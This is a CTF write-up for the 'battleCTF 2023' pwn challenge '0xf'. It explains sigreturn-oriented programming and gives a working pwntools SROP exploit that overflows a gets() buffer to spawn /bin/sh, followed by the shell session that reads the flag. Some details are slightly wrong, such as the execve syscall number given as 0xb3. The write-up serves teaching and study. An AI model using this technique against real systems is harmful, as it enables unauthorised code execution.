---
title: PWN srop exploitation technical
categories: CTF 
image: null
published: true
---


H3ll0 pwn3rs !!!

in this article, we are going to learn how to use srop technical to make ropchain


So what is `SROP`

To understand this exploit technical, you must understand how  `x86 sigreturn syscall` work.
The cause is  srop exploit `sigreturn` syscall functionnality to make ROP (return oriented programming)

# sigreturn syscall 
```
Sigreturn (syscall 0xf) is a syscall used to restore the entire register context from memory pointed at by ESP or RSP for x86_64 arch.
That said when the cpu exec syscall(rax=0xf), the program will read frame pointed by stack pointer
and restor  it value into registers. This frame has a  specific format for each CPU arch  so the CPU know that at offset xx, it is the rax register value and at offset yy it is the value of rbx
```

How this can help us to exploit a program.

If you can overwrite the stack frame after sigreturn syscall, by exploiting buffer overflow vuln for example, you can control the value of cpu registers and that is where you can do rop chain.
For instance, let said  on x86_64 by overwriting the stack frame after sigreturn syscall  call you are able to overwrite: 
- rax to 0xb3
- rdi to the address of "bin/sh" string
- rsi to 0
- rip to sycall gadget

That will let the program make execve("/bin/sh") and you get the shell.


# Pratical part
In this part, i will use Africa Battle CTF 2023 challenge to show a pratical case of this exploitation technical 

Let start !!!!!!!!!!!!!!!!!!!!!!
The challenge was named: `0xf`

The binary file `syscall` is an ELF x86_64 dynamically linkded and not stripped.

When we check mitigation we can see that the binary don't has `stack cannary` protection , `No PIE` and the stack is not executable
```bash
file syscall 
syscall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=aed719058a5efedf4d245c5c3c610937cd8d4ad7, for GNU/Linux 3.2.0, not stripped
┌─[top0n3@parrot]─[/media/top0n3/7B29B9A756CC225A/ctf/battleCTF-2023-main/Prequal/Pwn/0xf/source]
└──╼ $pwn checksec syscall 
[*] '/media/top0n3/7B29B9A756CC225A/ctf/battleCTF-2023-main/Prequal/Pwn/0xf/source/syscall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No

```


![recon](/assets/pwn/battle_0xf_recon.png)

Through gdb-gef session, we can see that the binary are  two defined function `main` and `hausa`.

i used ghidra to decompile these function .
```

undefined8 main(void)

{
  char local_38 [48];
  
  puts("Africa battle CTF 2023");
  puts("Tell us about your ethnicity:");
  gets(local_38);
  return 0;
}

undefined8 hausa(void)

{
  return 0xf;
}


```

main function call gets(local_38) so the program is vulnerable to Buffer overflow.
But what to do with this vulnerability!?
I search for gadget to make ropchain, i noticed that we don't have a lot of gadget.
By those gadgets are very interesting
```
mov rax, 0xf; ret
syscall; ret
```
if we overwrite saved rip to `mov rax, 0xf; ret` and saved rip + 8 to `syscall; ret`, the program will make signreturn syscall and.
So the the thing that we must do here is to create a frame that will help us to make execve(/bin/sh) and sand payload like this `mov rax,0xf;ret` + `syscall; ret` + our created frame data.

Pwn tool python  module can help us to create this frame . The only thing that we need is to find `/bin/sh` address and use it with our previous gadget. 
Luckly we have "/bin/sh" string on the binary.

Bellow is the final exploit

```python
from pwn import *



# Set up pwntools for the correct architecture
elf = exe = context.binary = ELF(args.EXE or 'syscall')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Gadget to make srop 
bin_sh = int(next(elf.search(b'/bin/sh'))) # /bin/sh string
offset = 56  # offset to overwrite return address
mov_rax_0xf = next(elf.search(asm('mov eax ,0xf')))   # signreturn gadget
syscall_ret = next(elf.search(asm('syscall; ret')))  # syscall gadget

########################  Payload ########################
frame = SigreturnFrame(kernel='amd64') 
frame.rax = constants.SYS_execve
frame.rdi =  bin_sh
frame.rdx = 0                 # envp = NULL
frame.rip = syscall_ret  

payload = cyclic(offset)
payload += p64(mov_rax_0xf) 
payload += p64(syscall_ret)
payload += bytes(frame)

io = start()
io.sendline(payload)
io.interactive()

```

```bash
┌─[top0n3@parrot]─[/media/top0n3/7B29B9A756CC225A/ctf/battleCTF-2023-main/Prequal/Pwn/0xf/source]                                                                                        [0/3]
└──╼ $python3 exploit.py 
[*] '/media/top0n3/7B29B9A756CC225A/ctf/battleCTF-2023-main/Prequal/Pwn/0xf/source/syscall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Starting local process '/media/top0n3/7B29B9A756CC225A/ctf/battleCTF-2023-main/Prequal/Pwn/0xf/source/syscall': pid 191168
[*] Switching to interactive mode
Africa battle CTF 2023
Tell us about your ethnicity:
$ ls
__pycache__  exploit.py  flag.txt  syscall
$ cat flag.txt
battleCTF{Ethnicity_SigROP_Syscall_Army_f0d9e29e9c1d03c996083bb9c3325d33}
$  
```
and we get the flag by making `SROP`
